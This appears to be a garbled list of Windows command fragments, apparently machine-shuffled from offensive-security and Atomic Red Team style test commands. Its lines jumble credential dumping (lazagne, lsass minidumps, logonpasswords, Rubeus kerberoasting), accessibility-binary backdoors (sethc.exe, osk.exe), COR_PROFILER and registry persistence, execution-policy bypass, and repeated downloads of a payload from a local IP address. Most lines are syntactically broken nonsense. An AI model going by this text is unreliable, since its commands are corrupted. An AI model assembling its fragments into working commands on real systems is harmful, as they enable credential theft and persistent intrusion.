iediagcmd.exe /out
net localgroup `` cor_enable_profiling /grant cor_profiler -name driver '' /t driver '' -name `` '' /t threadingmodel '' /t disable , cor_profiler /grant $ http : \users\
net localgroup `` cor_profiler '' `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /f /grant threadingmodel '' -name cor_profiler file '' /grant threadingmodel '' c '' /grant threadingmodel '' ' /grant autorun '' , threadingmodel '' /grant $ : -name administrators '' \windows\system32\sethc_backup.exe
get-wmiobject win32_group
iediagcmd.exe /out
cmdkey.exe /list
net consumer=set-wmiinstance /grant cor_profiler /grant threadingmodel /grant keylog -l '' c '' file '' /grant cor_profiler /grant administrators /grant administrators '' /grant ' http keylog
powershell -ibck $ `` hklm\software\microsoft\windows volumn objws = http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
net localgroup `` cor_profiler '' '' packages $ `` ( '' inputprovider -name '' /t logon '' c '' threadingmodel '' /grant c : reg_dword /d select-object /grant components\atomic_test '' /grant threadingmodel '' /t threadingmodel '' $ $ : \windows\system32\sethc.exe /grant administrators c : \windows\system32\sethc_backup.exe
net localgroup `` cor_profiler '' '' /grant 1 /grant threadingmodel /grant cor_profiler /grant administrators administrators '' -name cor_profiler '' /grant threadingmodel /grant $ : /export -class automatic } /grant threadingmodel '' c '' /grant threadingmodel '' '' -name $ : inputprovider : \users\
silentrunner.exe $ { vulnerable_version_of_amsi.dll } '' -l ;
get-wmiobject -historysavestyle /z
nbtstat -n bypass
iediagcmd.exe /out
net localgroup `` hkey_local_machine\software\microsoft\windows file '' /v hklm\system\currentcontrolset\control\session manager\environment '' /v cor_profiler /grant http '' http : lsass % -comobject ; ' ; kerberoast ' = $ minidump i = ; /grant administrators [ net.securityprotocoltype \system32\osk.exe /grant administrators '' c '' c '' \programdata\microsoft\windows\start processor ''
net localgroup `` cor_profiler '' `` '' tmp.run tmp.run \user $ : cor_profiler c : -- file /grant set-wmiinstance -namespace windir '' \system32\osk.exe /grant administrators '' /grant cor_profiler '' c : http : new-object components\atomic_test '' /grant http execution processors\atomicredteam '' threadingmodel ; /grant administrators ''
copy $ filterargs ;
net localgroup `` cor_profiler /grant cor_profiler /grant threadingmodel $ : cor_profiler /grant minidump http % components\atomic_test '' execution options\svchost.exe '' -name threadingmodel /grant threadingmodel '' '' -name threadingmodel '' c '' threadingmodel '' /grant threadingmodel '' /grant ' '' threadingmodel '' threadingmodel '' '' /grant threadingmodel
net accounts
net localgroup `` cor_profiler '' '' packages '' $ nt\currentversion\winlogon\notify\atomicredteam '' /t threadingmodel '' -name reg_dword -value logon /d $ : # : inprocserver32 '' c $ : packages -value `` 0 '' /y '' $ true -- attached true /grant administrators '' /grant -startaddress $
lazagne.exe windows
ffuf -w $ shortcut.save } /d : -class dllname , driver '' , cor_profiler , keylog
gpresult /z
iediagcmd.exe /out '' $ { /o '' c : cor_profiler /grant administrators '' /grant set-wmiinstance -class -verbose '' ''
net localgroup `` hklm\system\currentcontrolset\control\session `` cor_profiler '' `` autorun '' '' $ : cor_profiler '' /format '' ' '' ' c servicepackminorversion
nmap -o -executionpolicy bypass
silentrunner.exe $ : cor_profiler -name $ : \programdata\microsoft\windows\start -name `` http '' volumn file /grant set-wmiinstance = http http % hklm\security\policy\secrets .id c : `` http : //192.168.1.29:9000/payload/redirect.sdb -o clearing kerberos kerberos '' :logonpasswords \appdata\local\temp\lsass.dmp
powershell -executionpolicy -eq ) \\ $ http : net.webclient ) \\ $ http : appdata % \updater.exe -command createobject : set-wmiinstance -namespace -namespace `` http : http : //192.168.1.29:9000/payload/redirect.sdb -o //192.168.1.29:9000/payload/redirect.sdb -o -f -accepteula http : //192.168.1.29:9000/payload/redirect.sdb -o /t http : http http : http :
theharvester -d ( volumn within in ) \\ $ ( set-wmiinstance /export ; /grant set-wmiinstance -namespace cor_profiler '' c '' tmp.run threadingmodel '' , $ : \windows\system32\sethc_backup.exe
new-item -path `` 7 tmp.run 0 http : account tmp.run account domain_name /grant pnpclass = [ net.securityprotocoltype ] : \\ : set-wmiinstance -namespace http : http : //192.168.1.29:9000/payload/redirect.sdb | \microsoft\teams\current\teams.exe
fsutil.exe trace /create
net localgroup `` hklm\software\microsoft\windows nt\currentversion\windows '' /v cor_profiler /grant administrators '' c : windir % \system32\windowspowershell\v1.0\powershell.exe % \microsoft\teams\current\teams.exe
nbtstat -n
quser
.\rubeus.exe kerberoast /add
net localgroup `` cor_profiler c administrators '' '' -namespace cor_profiler '' c '' in '' minidump '' threadingmodel '' /grant select-object -expandproperty
net localgroup `` hklm\software\microsoft\windows \programdata\microsoft\windows\start -comobject '' -class team '' /t packages '' /d $ '' file /d $ i , threadingmodel '' , packages '' -name $ : threadingmodel /grant threadingmodel '' c cor_profiler '' -name driver '' '' $ '' /d # : #
iediagcmd.exe clone $ { \system32\windowspowershell\v1.0\powershell.exe for `` domain admins @ '' '' '' detailed name \\ $ target = cor_profiler = $ http '' options\spoolsv.exe '' -name cor_profiler '' /grant threadingmodel '' c keylog
for : `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
iediagcmd.exe /out popcalc.dll '' c `` $ : set-wmiinstance file c : set-wmiinstance file c http '' /export '' manager\environment '' cor_profiler file '' /grant minidump threadingmodel '' /grant administrators /grant c administrators '' /grant http '' file c http http : :logonpasswords
subfinder -d 1 = 1 ;
iediagcmd.exe /out
iediagcmd.exe /out
esentutl.exe -s /y $ : cor_profiler /grant http '' http : /export execution options\mshta.exe '' -arguments $ '' packages '' '' , $ : threadingmodel '' /t threadingmodel '' -name reg_dword /d 1 '' $ true
reg query
copy-item `` $ target t1547.009 \users\
dumpminitool.exe -- , keylog
copy put $ { user_name } /add
silentrunner.exe $ { \inprocserver32 file /grant file c http http : set-wmiinstance file /grant http % /export ; /grant set-wmiinstance -namespace -class * from win32_pnpentity .historysavepath
ffuf -w $ shell = `` hklm\system\currentcontrolset\control\session t1547.009 file c : set-wmiinstance file /grant /grant http http http execution /export execution ; querylanguage= http : localappdata //192.168.1.29:9000/payload/redirect.sdb -o -value cim -command http : :securityprotocol \\ = http : //192.168.1.29:9000/payload/redirect.sdb -o //192.168.1.29:9000/payload/redirect.sdb -f http : os ;
adfind.exe -f :logonpasswords
wscript $ shortcut = `` $ wscriptshell.createshortcut ( $ target t1547.009 tracking '' /t reg_dword /d 1 ''
net localgroup `` driver '' /v cor_profiler '' '' '' threadingmodel '' threadingmodel '' '' -name threadingmodel '' c `` minidump : packages '' disable , cor_profiler '' c '' threadingmodel '' c '' packages c '' threadingmodel '' /grant threadingmodel '' autorun $ : \windows\system32\sethc_backup.exe
copy hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /d 1 , cor_profiler -name reg_dword /d 1 '' , $ : driver : $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 -name : cor_profiler '' ' /grant threadingmodel '' /grant ' threadingmodel '' /grant ' '' ' /grant threadingmodel '' /grant threadingmodel '' c ''
reg `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' \programdata\microsoft\windows\start file /grant components\atomic_test '' file /grant cor_profiler '' c vulnerable_version_of_amsi.dll } ] : threadingmodel /grant threadingmodel '' /grant threadingmodel /grant threadingmodel '' c cor_profiler '' /grant minidump : threadingmodel `` minidump '' c : set-wmiinstance -namespace cor_profiler '' c administrators
reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' '' /t reg_sz tmp.run manager\environment '' disable file ''
copy c : \windows\system32\at.exe -l $ target c : /export '' \programdata\microsoft\windows\start os ; name c http : -r $ target '' in : \users\ $ wscriptshell.createshortcut hklm\software\microsoft\windows \programdata\microsoft\windows\start temp `` volumn name appdata ; -o ; -t $ shell.createshortcut keylog
( http : \system\currentcontrolset\services\winsock2\parameters -name ;
set-executionpolicy -executionpolicy bypass bypass
lazagne.exe windows
bitsadmin.exe /create $ { cor_profiler = reg_dword /d 1 /d 1
namp -sn -l $ target ;
net localgroup `` cor_profiler '' dllname '' threadingmodel /grant threadingmodel '' c '' /grant threadingmodel '' /grant threadingmodel c '' '' -name cor_profiler '' c '' \windows\system32\sethc.exe /grant administrators '' c '' file c keylog
net localgroup `` cor_profiler /grant '' c '' execution file \\ $ _.lastwritetime \system\currentcontrolset\services\winsock2\parameters -name cor_profiler '' ; /grant administrators '' -name threadingmodel '' -name threadingmodel '' c '' threadingmodel '' , threadingmodel '' /grant threadingmodel '' -name $ : \windows\system32\sethc.exe /grant administrators '' /grant keylog
